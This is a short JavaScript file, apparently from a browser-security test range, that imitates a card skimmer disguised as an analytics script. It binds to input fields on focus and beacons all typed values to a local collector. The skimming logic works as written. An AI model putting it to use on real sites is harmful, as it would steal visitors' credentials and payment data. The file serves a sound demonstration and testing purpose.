// Test range: a fake "analytics" script, loaded from localhost so it's another origin than the page (127.0.0.1).
// It does what a session-replay tool or a card skimmer does: binds to fields when you focus them, reads what you
// type, and beacons it to a collector. The collector is the test-range server, which throws it away.
(() => {
  const bound = new WeakSet();
  let timer;
  const flush = () => {
    const data = {};
    for (const el of document.querySelectorAll('input')) if (el.value) data[el.name || el.type] = el.value;
    navigator.sendBeacon('http://localhost:8790/collect', JSON.stringify({ page: location.pathname, fields: data }));
    const log = document.getElementById('log');
    if (log) log.textContent += `\nbeacon → localhost:8790/collect  (${Object.keys(data).join(', ')})`;
  };
  document.addEventListener('focusin', e => {
    const el = e.target;
    if (!(el instanceof HTMLInputElement) || bound.has(el)) return;
    bound.add(el);
    el.addEventListener('input', () => { clearTimeout(timer); timer = setTimeout(flush, 600); });
  });
})();
